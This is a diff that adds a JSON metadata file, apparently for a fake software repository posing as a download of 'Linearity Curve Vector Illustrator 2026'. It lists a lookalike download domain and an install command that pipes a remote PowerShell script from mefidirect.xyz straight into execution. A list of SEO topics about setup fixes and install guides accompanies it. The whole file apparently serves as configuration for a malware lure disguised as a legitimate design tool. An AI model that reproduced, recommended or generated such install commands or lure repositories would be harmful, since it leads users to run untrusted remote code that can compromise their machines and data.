@@ -1,0 +1,29 @@
+{
+  "repo": "linearity-curve-vector-illustrator-2026",
+  "product": "Linearity Curve Vector Illustrator 2026",
+  "kind": "design",
+  "install_type": "download",
+  "download_url": "https://linearity-curve.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "design",
+  "topics": [
+    "linearity-curve-full",
+    "linearity-curve-app",
+    "linearity-curve-ui-design-tool",
+    "linearity-curve-windows",
+    "linearity-curve-setup-failed-fix",
+    "how-to-install-linearity-curve",
+    "linearity-curve-design-workspace",
+    "linearity-curve-desktop-client",
+    "linearity-curve-setup-guide",
+    "linearity-curve-setup-guide-2026",
+    "linearity-curve-download",
+    "media-tools",
+    "pc-software",
+    "creative-tools",
+    "windows-tools"
+  ]
+}
